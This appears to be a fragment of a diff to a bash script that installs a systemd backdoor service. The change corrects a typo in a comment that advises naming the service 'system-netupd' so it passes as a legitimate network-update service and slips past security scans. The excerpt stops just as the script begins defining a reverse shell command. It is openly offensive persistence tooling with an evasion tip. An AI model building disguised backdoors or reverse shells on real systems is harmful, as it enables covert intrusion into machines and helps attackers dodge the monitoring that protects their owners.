@@ -2,7 +2,7 @@
 
 #!/bin/bash
 
-# Define the systemd backdoor service name (consider that names like "sytem-netupd" may trick most unaware security scans by being something required for proper/updated functionalities of system operations, such as in this case "system network updates".
+# Define the systemd backdoor service name (consider that names like "system-netupd" may trick most unaware security scans by being something required for proper/updated functionalities of system operations, such as in this case "system network updates".
 SERVICE_NAME="system-netupd"
 
 # Define the target reverse shell command
